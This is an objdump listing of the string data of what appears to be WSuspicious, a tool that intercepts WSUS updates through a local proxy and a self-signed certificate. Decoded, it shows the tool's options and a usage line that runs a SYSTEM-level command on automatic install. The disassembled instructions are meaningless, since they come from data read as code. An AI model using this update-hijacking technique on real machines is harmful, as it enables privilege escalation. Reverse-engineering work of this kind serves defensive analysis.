  407ee9:	68 00 74 00 74       	push   $0x74007400
  407eee:	00 70 00             	add    %dh,0x0(%eax)
  407ef1:	73 00                	jae    0x407ef3
  407ef3:	00 15 2f 00 65 00    	add    %dl,0x65002f
  407ef9:	6e                   	outsb  %ds:(%esi),(%dx)
  407efa:	00 61 00             	add    %ah,0x0(%ecx)
  407efd:	62 00                	bound  %eax,(%eax)
  407eff:	6c                   	insb   (%dx),%es:(%edi)
  407f00:	00 65 00             	add    %ah,0x0(%ebp)
  407f03:	74 00                	je     0x407f05
  407f05:	6c                   	insb   (%dx),%es:(%edi)
  407f06:	00 73 00             	add    %dh,0x0(%ebx)
  407f09:	00 80 93 54 00 68    	add    %al,0x68005493(%eax)
  407f0f:	00 65 00             	add    %ah,0x0(%ebp)
  407f12:	20 00                	and    %al,(%eax)
  407f14:	57                   	push   %edi
  407f15:	00 53 00             	add    %dl,0x0(%ebx)
  407f18:	55                   	push   %ebp
  407f19:	00 53 00             	add    %dl,0x0(%ebx)
  407f1c:	20 00                	and    %al,(%eax)
  407f1e:	53                   	push   %ebx
  407f1f:	00 65 00             	add    %ah,0x0(%ebp)
  407f22:	72 00                	jb     0x407f24
  407f24:	76 00                	jbe    0x407f26
  407f26:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407f2a:	20 00                	and    %al,(%eax)
  407f2c:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  407f32:	75 00                	jne    0x407f34
  407f34:	73 00                	jae    0x407f36
  407f36:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  407f3c:	20 00                	and    %al,(%eax)
  407f3e:	48                   	dec    %eax
  407f3f:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  407f43:	00 50 00             	add    %dl,0x0(%eax)
  407f46:	53                   	push   %ebx
  407f47:	00 2e                	add    %ch,(%esi)
  407f49:	00 20                	add    %ah,(%eax)
  407f4b:	00 41 00             	add    %al,0x0(%ecx)
  407f4e:	64 00 64 00 69       	add    %ah,%fs:0x69(%eax,%eax,1)
  407f53:	00 6e 00             	add    %ch,0x0(%esi)
  407f56:	67 00 20             	add    %ah,(%bx,%si)
  407f59:	00 61 00             	add    %ah,0x0(%ecx)
  407f5c:	20 00                	and    %al,(%eax)
  407f5e:	73 00                	jae    0x407f60
  407f60:	65 00 6c 00 66       	add    %ch,%gs:0x66(%eax,%eax,1)
  407f65:	00 2d 00 73 00 69    	add    %ch,0x69007300
  407f6b:	00 67 00             	add    %ah,0x0(%edi)
  407f6e:	6e                   	outsb  %ds:(%esi),(%dx)
  407f6f:	00 65 00             	add    %ah,0x0(%ebp)
  407f72:	64 00 20             	add    %ah,%fs:(%eax)
  407f75:	00 63 00             	add    %ah,0x0(%ebx)
  407f78:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407f7c:	74 00                	je     0x407f7e
  407f7e:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  407f84:	63 00                	arpl   %eax,(%eax)
  407f86:	61                   	popa
  407f87:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407f8b:	00 20                	add    %ah,(%eax)
  407f8d:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  407f91:	00 20                	add    %ah,(%eax)
  407f93:	00 73 00             	add    %dh,0x0(%ebx)
  407f96:	74 00                	je     0x407f98
  407f98:	6f                   	outsl  %ds:(%esi),(%dx)
  407f99:	00 72 00             	add    %dh,0x0(%edx)
  407f9c:	65 00 01             	add    %al,%gs:(%ecx)
  407f9f:	67 50                	addr16 push %eax
  407fa1:	00 72 00             	add    %dh,0x0(%edx)
  407fa4:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa5:	00 6d 00             	add    %ch,0x0(%ebp)
  407fa8:	70 00                	jo     0x407faa
  407faa:	74 00                	je     0x407fac
  407fac:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  407fb2:	20 00                	and    %al,(%eax)
  407fb4:	75 00                	jne    0x407fb6
  407fb6:	73 00                	jae    0x407fb8
  407fb8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407fbc:	20 00                	and    %al,(%eax)
  407fbe:	74 00                	je     0x407fc0
  407fc0:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc1:	00 20                	add    %ah,(%eax)
  407fc3:	00 61 00             	add    %ah,0x0(%ecx)
  407fc6:	64 00 64 00 20       	add    %ah,%fs:0x20(%eax,%eax,1)
  407fcb:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  407fcf:	00 65 00             	add    %ah,0x0(%ebp)
  407fd2:	20 00                	and    %al,(%eax)
  407fd4:	63 00                	arpl   %eax,(%eax)
  407fd6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407fda:	74 00                	je     0x407fdc
  407fdc:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  407fe2:	63 00                	arpl   %eax,(%eax)
  407fe4:	61                   	popa
  407fe5:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407fe9:	00 2e                	add    %ch,(%esi)
  407feb:	00 20                	add    %ah,(%eax)
  407fed:	00 50 00             	add    %dl,0x0(%eax)
  407ff0:	6c                   	insb   (%dx),%es:(%edi)
  407ff1:	00 65 00             	add    %ah,0x0(%ebp)
  407ff4:	61                   	popa
  407ff5:	00 73 00             	add    %dh,0x0(%ebx)
  407ff8:	65 00 20             	add    %ah,%gs:(%eax)
  407ffb:	00 77 00             	add    %dh,0x0(%edi)
  407ffe:	61                   	popa
  407fff:	00 69 00             	add    %ch,0x0(%ecx)
  408002:	74 00                	je     0x408004
  408004:	2e 00 00             	add    %al,%cs:(%eax)
  408007:	80 a7 54 00 68 00 65 	andb   $0x65,0x680054(%edi)
  40800e:	00 20                	add    %ah,(%eax)
  408010:	00 57 00             	add    %dl,0x0(%edi)
  408013:	53                   	push   %ebx
  408014:	00 55 00             	add    %dl,0x0(%ebp)
  408017:	53                   	push   %ebx
  408018:	00 20                	add    %ah,(%eax)
  40801a:	00 53 00             	add    %dl,0x0(%ebx)
  40801d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408021:	76 00                	jbe    0x408023
  408023:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408027:	20 00                	and    %al,(%eax)
  408029:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  40802f:	75 00                	jne    0x408031
  408031:	73 00                	jae    0x408033
  408033:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  408039:	20 00                	and    %al,(%eax)
  40803b:	48                   	dec    %eax
  40803c:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  408040:	00 50 00             	add    %dl,0x0(%eax)
  408043:	53                   	push   %ebx
  408044:	00 20                	add    %ah,(%eax)
  408046:	00 61 00             	add    %ah,0x0(%ecx)
  408049:	6e                   	outsb  %ds:(%esi),(%dx)
  40804a:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40804e:	00 77 00             	add    %dh,0x0(%edi)
  408051:	65 00 20             	add    %ah,%gs:(%eax)
  408054:	00 61 00             	add    %ah,0x0(%ecx)
  408057:	72 00                	jb     0x408059
  408059:	65 00 20             	add    %ah,%gs:(%eax)
  40805c:	00 6e 00             	add    %ch,0x0(%esi)
  40805f:	6f                   	outsl  %ds:(%esi),(%dx)
  408060:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  408064:	00 63 00             	add    %ah,0x0(%ebx)
  408067:	6f                   	outsl  %ds:(%esi),(%dx)
  408068:	00 6e 00             	add    %ch,0x0(%esi)
  40806b:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40806f:	67 00 75 00          	add    %dh,0x0(%di)
  408073:	72 00                	jb     0x408075
  408075:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40807a:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40807e:	00 20                	add    %ah,(%eax)
  408080:	00 61 00             	add    %ah,0x0(%ecx)
  408083:	63 00                	arpl   %eax,(%eax)
  408085:	63 00                	arpl   %eax,(%eax)
  408087:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40808b:	74 00                	je     0x40808d
  40808d:	20 00                	and    %al,(%eax)
  40808f:	54                   	push   %esp
  408090:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  408094:	00 20                	add    %ah,(%eax)
  408096:	00 63 00             	add    %ah,0x0(%ebx)
  408099:	6f                   	outsl  %ds:(%esi),(%dx)
  40809a:	00 6e 00             	add    %ch,0x0(%esi)
  40809d:	6e                   	outsb  %ds:(%esi),(%dx)
  40809e:	00 65 00             	add    %ah,0x0(%ebp)
  4080a1:	63 00                	arpl   %eax,(%eax)
  4080a3:	74 00                	je     0x4080a5
  4080a5:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4080ab:	73 00                	jae    0x4080ad
  4080ad:	2e 00 00             	add    %al,%cs:(%eax)
  4080b0:	19 45 00             	sbb    %eax,0x0(%ebp)
  4080b3:	78 00                	js     0x4080b5
  4080b5:	69 00 74 00 69 00    	imul   $0x690074,(%eax),%eax
  4080bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4080bc:	00 67 00             	add    %ah,0x0(%edi)
  4080bf:	20 00                	and    %al,(%eax)
  4080c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4080c2:	00 6f 00             	add    %ch,0x0(%edi)
  4080c5:	77 00                	ja     0x4080c7
  4080c7:	2e 00 00             	add    %al,%cs:(%eax)
  4080ca:	35 44 00 65 00       	xor    $0x650044,%eax
  4080cf:	74 00                	je     0x4080d1
  4080d1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4080d5:	74 00                	je     0x4080d7
  4080d7:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  4080dc:	00 57 00             	add    %dl,0x0(%edi)
  4080df:	53                   	push   %ebx
  4080e0:	00 55 00             	add    %dl,0x0(%ebp)
  4080e3:	53                   	push   %ebx
  4080e4:	00 20                	add    %ah,(%eax)
  4080e6:	00 53 00             	add    %dl,0x0(%ebx)
  4080e9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4080ed:	76 00                	jbe    0x4080ef
  4080ef:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4080f3:	20 00                	and    %al,(%eax)
  4080f5:	2d 00 20 00 7b       	sub    $0x7b002000,%eax
  4080fa:	00 30                	add    %dh,(%eax)
  4080fc:	00 7d 00             	add    %bh,0x0(%ebp)
  4080ff:	01 09                	add    %ecx,(%ecx)
  408101:	2f                   	das
  408102:	00 65 00             	add    %ah,0x0(%ebp)
  408105:	78 00                	js     0x408107
  408107:	65 00 00             	add    %al,%gs:(%eax)
  40810a:	1b 2f                	sbb    (%edi),%ebp
  40810c:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  408110:	00 77 00             	add    %dh,0x0(%edi)
  408113:	6e                   	outsb  %ds:(%esi),(%dx)
  408114:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  408118:	00 61 00             	add    %ah,0x0(%ecx)
  40811b:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40811f:	6f                   	outsl  %ds:(%esi),(%dx)
  408120:	00 72 00             	add    %dh,0x0(%edx)
  408123:	74 00                	je     0x408125
  408125:	00 11                	add    %dl,(%ecx)
  408127:	2f                   	das
  408128:	00 63 00             	add    %ah,0x0(%ebx)
  40812b:	6f                   	outsl  %ds:(%esi),(%dx)
  40812c:	00 6d 00             	add    %ch,0x0(%ebp)
  40812f:	6d                   	insl   (%dx),%es:(%edi)
  408130:	00 61 00             	add    %ah,0x0(%ecx)
  408133:	6e                   	outsb  %ds:(%esi),(%dx)
  408134:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  408138:	0d 2f 00 64 00       	or     $0x64002f,%eax
  40813d:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  408141:	75 00                	jne    0x408143
  408143:	67 00 00             	add    %al,(%bx,%si)
  408146:	1b 6c 00 6f          	sbb    0x6f(%eax,%eax,1),%ebp
  40814a:	00 63 00             	add    %ah,0x0(%ebx)
  40814d:	61                   	popa
  40814e:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  408152:	00 6f 00             	add    %ch,0x0(%edi)
  408155:	73 00                	jae    0x408157
  408157:	74 00                	je     0x408159
  408159:	3a 00                	cmp    (%eax),%al
  40815b:	7b 00                	jnp    0x40815d
  40815d:	30 00                	xor    %al,(%eax)
  40815f:	7d 00                	jge    0x408161
  408161:	00 15 2f 00 70 00    	add    %dl,0x70002f
  408167:	72 00                	jb     0x408169
  408169:	6f                   	outsl  %ds:(%esi),(%dx)
  40816a:	00 78 00             	add    %bh,0x0(%eax)
  40816d:	79 00                	jns    0x40816f
  40816f:	70 00                	jo     0x408171
  408171:	6f                   	outsl  %ds:(%esi),(%dx)
  408172:	00 72 00             	add    %dh,0x0(%edx)
  408175:	74 00                	je     0x408177
  408177:	00 2b                	add    %ch,(%ebx)
  408179:	48                   	dec    %eax
  40817a:	00 69 00             	add    %ch,0x0(%ecx)
  40817d:	74 00                	je     0x40817f
  40817f:	20 00                	and    %al,(%eax)
  408181:	61                   	popa
  408182:	00 6e 00             	add    %ch,0x0(%esi)
  408185:	79 00                	jns    0x408187
  408187:	20 00                	and    %al,(%eax)
  408189:	6b 00 65             	imul   $0x65,(%eax),%eax
  40818c:	00 79 00             	add    %bh,0x0(%ecx)
  40818f:	20 00                	and    %al,(%eax)
  408191:	74 00                	je     0x408193
  408193:	6f                   	outsl  %ds:(%esi),(%dx)
  408194:	00 20                	add    %ah,(%eax)
  408196:	00 65 00             	add    %ah,0x0(%ebp)
  408199:	78 00                	js     0x40819b
  40819b:	69 00 74 00 2e 00    	imul   $0x2e0074,(%eax),%eax
  4081a1:	2e 00 00             	add    %al,%cs:(%eax)
  4081a4:	19 2f                	sbb    %ebp,(%edi)
  4081a6:	00 61 00             	add    %ah,0x0(%ecx)
  4081a9:	75 00                	jne    0x4081ab
  4081ab:	74 00                	je     0x4081ad
  4081ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ae:	00 69 00             	add    %ch,0x0(%ecx)
  4081b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4081b2:	00 73 00             	add    %dh,0x0(%ebx)
  4081b5:	74 00                	je     0x4081b7
  4081b7:	61                   	popa
  4081b8:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4081bc:	00 00                	add    %al,(%eax)
  4081be:	80 cd 43             	or     $0x43,%ch
  4081c1:	00 6f 00             	add    %ch,0x0(%edi)
  4081c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c5:	00 73 00             	add    %dh,0x0(%ebx)
  4081c8:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  4081ce:	72 00                	jb     0x4081d0
  4081d0:	20 00                	and    %al,(%eax)
  4081d2:	72 00                	jb     0x4081d4
  4081d4:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4081d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4081d9:	00 76 00             	add    %dh,0x0(%esi)
  4081dc:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4081e2:	20 00                	and    %al,(%eax)
  4081e4:	74 00                	je     0x4081e6
  4081e6:	68 00 65 00 20       	push   $0x20006500
  4081eb:	00 73 00             	add    %dh,0x0(%ebx)
  4081ee:	65 00 6c 00 66       	add    %ch,%gs:0x66(%eax,%eax,1)
  4081f3:	00 2d 00 73 00 69    	add    %ch,0x69007300
  4081f9:	00 67 00             	add    %ah,0x0(%edi)
  4081fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4081fd:	00 65 00             	add    %ah,0x0(%ebp)
  408200:	64 00 20             	add    %ah,%fs:(%eax)
  408203:	00 63 00             	add    %ah,0x0(%ebx)
  408206:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40820a:	74 00                	je     0x40820c
  40820c:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  408212:	63 00                	arpl   %eax,(%eax)
  408214:	61                   	popa
  408215:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408219:	00 20                	add    %ah,(%eax)
  40821b:	00 66 00             	add    %ah,0x0(%esi)
  40821e:	72 00                	jb     0x408220
  408220:	6f                   	outsl  %ds:(%esi),(%dx)
  408221:	00 6d 00             	add    %ch,0x0(%ebp)
  408224:	20 00                	and    %al,(%eax)
  408226:	74 00                	je     0x408228
  408228:	68 00 65 00 20       	push   $0x20006500
  40822d:	00 73 00             	add    %dh,0x0(%ebx)
  408230:	74 00                	je     0x408232
  408232:	6f                   	outsl  %ds:(%esi),(%dx)
  408233:	00 72 00             	add    %dh,0x0(%edx)
  408236:	65 00 20             	add    %ah,%gs:(%eax)
  408239:	00 28                	add    %ch,(%eax)
  40823b:	00 57 00             	add    %dl,0x0(%edi)
  40823e:	61                   	popa
  40823f:	00 72 00             	add    %dh,0x0(%edx)
  408242:	6e                   	outsb  %ds:(%esi),(%dx)
  408243:	00 69 00             	add    %ch,0x0(%ecx)
  408246:	6e                   	outsb  %ds:(%esi),(%dx)
  408247:	00 67 00             	add    %ah,0x0(%edi)
  40824a:	3a 00                	cmp    (%eax),%al
  40824c:	20 00                	and    %al,(%eax)
  40824e:	69 00 74 00 20 00    	imul   $0x200074,(%eax),%eax
  408254:	77 00                	ja     0x408256
  408256:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  40825c:	20 00                	and    %al,(%eax)
  40825e:	70 00                	jo     0x408260
  408260:	72 00                	jb     0x408262
  408262:	6f                   	outsl  %ds:(%esi),(%dx)
  408263:	00 6d 00             	add    %ch,0x0(%ebp)
  408266:	70 00                	jo     0x408268
  408268:	74 00                	je     0x40826a
  40826a:	20 00                	and    %al,(%eax)
  40826c:	74 00                	je     0x40826e
  40826e:	68 00 65 00 20       	push   $0x20006500
  408273:	00 75 00             	add    %dh,0x0(%ebp)
  408276:	73 00                	jae    0x408278
  408278:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40827c:	20 00                	and    %al,(%eax)
  40827e:	61                   	popa
  40827f:	00 67 00             	add    %ah,0x0(%edi)
  408282:	61                   	popa
  408283:	00 69 00             	add    %ch,0x0(%ecx)
  408286:	6e                   	outsb  %ds:(%esi),(%dx)
  408287:	00 29                	add    %ch,(%ecx)
  408289:	00 2e                	add    %ch,(%esi)
  40828b:	00 01                	add    %al,(%ecx)
  40828d:	31 4e 00             	xor    %ecx,0x0(%esi)
  408290:	6f                   	outsl  %ds:(%esi),(%dx)
  408291:	00 20                	add    %ah,(%eax)
  408293:	00 57 00             	add    %dl,0x0(%edi)
  408296:	53                   	push   %ebx
  408297:	00 55 00             	add    %dl,0x0(%ebp)
  40829a:	53                   	push   %ebx
  40829b:	00 20                	add    %ah,(%eax)
  40829d:	00 53 00             	add    %dl,0x0(%ebx)
  4082a0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4082a4:	76 00                	jbe    0x4082a6
  4082a6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4082aa:	20 00                	and    %al,(%eax)
  4082ac:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4082b0:	74 00                	je     0x4082b2
  4082b2:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4082b6:	74 00                	je     0x4082b8
  4082b8:	65 00 64 00 2e       	add    %ah,%gs:0x2e(%eax,%eax,1)
  4082bd:	00 00                	add    %al,(%eax)
  4082bf:	1b 53 00             	sbb    0x0(%ebx),%edx
  4082c2:	74 00                	je     0x4082c4
  4082c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4082c5:	00 70 00             	add    %dh,0x0(%eax)
  4082c8:	70 00                	jo     0x4082ca
  4082ca:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4082d0:	20 00                	and    %al,(%eax)
  4082d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4082d3:	00 6f 00             	add    %ch,0x0(%edi)
  4082d6:	77 00                	ja     0x4082d8
  4082d8:	2e 00 00             	add    %al,%cs:(%eax)
  4082db:	8c 17                	mov    %ss,(%edi)
  4082dd:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  4082e2:	00 20                	add    %ah,(%eax)
  4082e4:	00 20                	add    %ah,(%eax)
  4082e6:	00 20                	add    %ah,(%eax)
  4082e8:	00 20                	add    %ah,(%eax)
  4082ea:	00 20                	add    %ah,(%eax)
  4082ec:	00 20                	add    %ah,(%eax)
  4082ee:	00 20                	add    %ah,(%eax)
  4082f0:	00 20                	add    %ah,(%eax)
  4082f2:	00 20                	add    %ah,(%eax)
  4082f4:	00 20                	add    %ah,(%eax)
  4082f6:	00 20                	add    %ah,(%eax)
  4082f8:	00 20                	add    %ah,(%eax)
  4082fa:	00 20                	add    %ah,(%eax)
  4082fc:	00 20                	add    %ah,(%eax)
  4082fe:	00 20                	add    %ah,(%eax)
  408300:	00 55 00             	add    %dl,0x0(%ebp)
  408303:	73 00                	jae    0x408305
  408305:	61                   	popa
  408306:	00 67 00             	add    %ah,0x0(%edi)
  408309:	65 00 3a             	add    %bh,%gs:(%edx)
  40830c:	00 20                	add    %ah,(%eax)
  40830e:	00 57 00             	add    %dl,0x0(%edi)
  408311:	53                   	push   %ebx
  408312:	00 75 00             	add    %dh,0x0(%ebp)
  408315:	73 00                	jae    0x408317
  408317:	70 00                	jo     0x408319
  408319:	69 00 63 00 69 00    	imul   $0x690063,(%eax),%eax
  40831f:	6f                   	outsl  %ds:(%esi),(%dx)
  408320:	00 75 00             	add    %dh,0x0(%ebp)
  408323:	73 00                	jae    0x408325
  408325:	20 00                	and    %al,(%eax)
  408327:	5b                   	pop    %ebx
  408328:	00 4f 00             	add    %cl,0x0(%edi)
  40832b:	50                   	push   %eax
  40832c:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  408330:	00 4f 00             	add    %cl,0x0(%edi)
  408333:	4e                   	dec    %esi
  408334:	00 5d 00             	add    %bl,0x0(%ebp)
  408337:	2e 00 2e             	add    %ch,%cs:(%esi)
  40833a:	00 2e                	add    %ch,(%esi)
  40833c:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  408342:	00 20                	add    %ah,(%eax)
  408344:	00 20                	add    %ah,(%eax)
  408346:	00 20                	add    %ah,(%eax)
  408348:	00 20                	add    %ah,(%eax)
  40834a:	00 20                	add    %ah,(%eax)
  40834c:	00 20                	add    %ah,(%eax)
  40834e:	00 20                	add    %ah,(%eax)
  408350:	00 20                	add    %ah,(%eax)
  408352:	00 20                	add    %ah,(%eax)
  408354:	00 20                	add    %ah,(%eax)
  408356:	00 20                	add    %ah,(%eax)
  408358:	00 20                	add    %ah,(%eax)
  40835a:	00 20                	add    %ah,(%eax)
  40835c:	00 20                	add    %ah,(%eax)
  40835e:	00 20                	add    %ah,(%eax)
  408360:	00 20                	add    %ah,(%eax)
  408362:	00 20                	add    %ah,(%eax)
  408364:	00 20                	add    %ah,(%eax)
  408366:	00 20                	add    %ah,(%eax)
  408368:	00 45 00             	add    %al,0x0(%ebp)
  40836b:	78 00                	js     0x40836d
  40836d:	2e 00 20             	add    %ah,%cs:(%eax)
  408370:	00 57 00             	add    %dl,0x0(%edi)
  408373:	53                   	push   %ebx
  408374:	00 75 00             	add    %dh,0x0(%ebp)
  408377:	73 00                	jae    0x408379
  408379:	70 00                	jo     0x40837b
  40837b:	69 00 63 00 69 00    	imul   $0x690063,(%eax),%eax
  408381:	6f                   	outsl  %ds:(%esi),(%dx)
  408382:	00 75 00             	add    %dh,0x0(%ebp)
  408385:	73 00                	jae    0x408387
  408387:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40838b:	78 00                	js     0x40838d
  40838d:	65 00 20             	add    %ah,%gs:(%eax)
  408390:	00 2f                	add    %ch,(%edi)
  408392:	00 63 00             	add    %ah,0x0(%ebx)
  408395:	6f                   	outsl  %ds:(%esi),(%dx)
  408396:	00 6d 00             	add    %ch,0x0(%ebp)
  408399:	6d                   	insl   (%dx),%es:(%edi)
  40839a:	00 61 00             	add    %ah,0x0(%ecx)
  40839d:	6e                   	outsb  %ds:(%esi),(%dx)
  40839e:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  4083a2:	00 22                	add    %ah,(%edx)
  4083a4:	00 20                	add    %ah,(%eax)
  4083a6:	00 2d 00 20 00 61    	add    %ch,0x61002000
  4083ac:	00 63 00             	add    %ah,0x0(%ebx)
  4083af:	63 00                	arpl   %eax,(%eax)
  4083b1:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  4083b5:	74 00                	je     0x4083b7
  4083b7:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  4083bb:	6c                   	insb   (%dx),%es:(%edi)
  4083bc:	00 61 00             	add    %ah,0x0(%ecx)
  4083bf:	20 00                	and    %al,(%eax)
  4083c1:	2d 00 20 00 73       	sub    $0x73002000,%eax
  4083c6:	00 20                	add    %ah,(%eax)
  4083c8:	00 2d 00 20 00 64    	add    %ch,0x64002000
  4083ce:	00 20                	add    %ah,(%eax)
  4083d0:	00 63 00             	add    %ah,0x0(%ebx)
  4083d3:	6d                   	insl   (%dx),%es:(%edi)
  4083d4:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4083d8:	00 2f                	add    %ch,(%edi)
  4083da:	00 20                	add    %ah,(%eax)
  4083dc:	00 63 00             	add    %ah,0x0(%ebx)
  4083df:	20 00                	and    %al,(%eax)
  4083e1:	22 00                	and    (%eax),%al
  4083e3:	22 00                	and    (%eax),%al
  4083e5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4083e9:	68 00 6f 00 20       	push   $0x20006f00
  4083ee:	00 31                	add    %dh,(%ecx)
  4083f0:	00 20                	add    %ah,(%eax)
  4083f2:	00 3e                	add    %bh,(%esi)
  4083f4:	00 20                	add    %ah,(%eax)
  4083f6:	00 43 00             	add    %al,0x0(%ebx)
  4083f9:	3a 00                	cmp    (%eax),%al
  4083fb:	5c                   	pop    %esp
  4083fc:	00 5c 00 77          	add    %bl,0x77(%eax,%eax,1)
  408400:	00 73 00             	add    %dh,0x0(%ebx)
  408403:	75 00                	jne    0x408405
  408405:	73 00                	jae    0x408407
  408407:	70 00                	jo     0x408409
  408409:	69 00 63 00 69 00    	imul   $0x690063,(%eax),%eax
  40840f:	6f                   	outsl  %ds:(%esi),(%dx)
  408410:	00 75 00             	add    %dh,0x0(%ebp)
  408413:	73 00                	jae    0x408415
  408415:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  40841a:	00 74 00 22          	add    %dh,0x22(%eax,%eax,1)
  40841e:	00 22                	add    %ah,(%edx)
  408420:	00 22                	add    %ah,(%edx)
  408422:	00 20                	add    %ah,(%eax)
  408424:	00 2f                	add    %ch,(%edi)
  408426:	00 61 00             	add    %ah,0x0(%ecx)
  408429:	75 00                	jne    0x40842b
  40842b:	74 00                	je     0x40842d
  40842d:	6f                   	outsl  %ds:(%esi),(%dx)
  40842e:	00 69 00             	add    %ch,0x0(%ecx)
  408431:	6e                   	outsb  %ds:(%esi),(%dx)
  408432:	00 73 00             	add    %dh,0x0(%ebx)
  408435:	74 00                	je     0x408437
  408437:	61                   	popa
  408438:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40843c:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  408442:	00 20                	add    %ah,(%eax)
  408444:	00 20                	add    %ah,(%eax)
  408446:	00 20                	add    %ah,(%eax)
  408448:	00 20                	add    %ah,(%eax)
  40844a:	00 20                	add    %ah,(%eax)
  40844c:	00 20                	add    %ah,(%eax)
  40844e:	00 20                	add    %ah,(%eax)
  408450:	00 20                	add    %ah,(%eax)
  408452:	00 20                	add    %ah,(%eax)
  408454:	00 20                	add    %ah,(%eax)
  408456:	00 20                	add    %ah,(%eax)
  408458:	00 20                	add    %ah,(%eax)
  40845a:	00 20                	add    %ah,(%eax)
  40845c:	00 20                	add    %ah,(%eax)
  40845e:	00 20                	add    %ah,(%eax)
  408460:	00 43 00             	add    %al,0x0(%ebx)
  408463:	72 00                	jb     0x408465
  408465:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408469:	74 00                	je     0x40846b
  40846b:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40846f:	20 00                	and    %al,(%eax)
  408471:	61                   	popa
  408472:	00 20                	add    %ah,(%eax)
  408474:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  408478:	00 63 00             	add    %ah,0x0(%ebx)
  40847b:	61                   	popa
  40847c:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  408480:	00 70 00             	add    %dh,0x0(%eax)
  408483:	72 00                	jb     0x408485
  408485:	6f                   	outsl  %ds:(%esi),(%dx)
  408486:	00 78 00             	add    %bh,0x0(%eax)
  408489:	79 00                	jns    0x40848b
  40848b:	20 00                	and    %al,(%eax)
  40848d:	74 00                	je     0x40848f
  40848f:	6f                   	outsl  %ds:(%esi),(%dx)
  408490:	00 20                	add    %ah,(%eax)
  408492:	00 69 00             	add    %ch,0x0(%ecx)
  408495:	6e                   	outsb  %ds:(%esi),(%dx)
  408496:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40849a:	00 72 00             	add    %dh,0x0(%edx)
  40849d:	63 00                	arpl   %eax,(%eax)
  40849f:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  4084a3:	74 00                	je     0x4084a5
  4084a5:	20 00                	and    %al,(%eax)
  4084a7:	57                   	push   %edi
  4084a8:	00 53 00             	add    %dl,0x0(%ebx)
  4084ab:	55                   	push   %ebp
